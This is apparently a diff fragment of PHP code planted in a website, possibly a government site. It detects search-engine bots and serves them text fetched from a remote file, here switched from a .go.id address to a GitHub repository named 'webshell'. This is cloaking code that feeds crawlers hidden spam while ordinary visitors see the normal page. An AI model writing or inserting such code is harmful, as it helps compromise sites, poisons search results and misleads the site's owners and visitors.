@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://kaurkab.go.id/cerita-lp.txt');
+    $message = file_get_contents('https://github.com/null7ganteng/webshell/raw/refs/heads/main/cerita-lp.txt');
     echo $message;
 exit; // Atau bisa menggunakan die()
 }
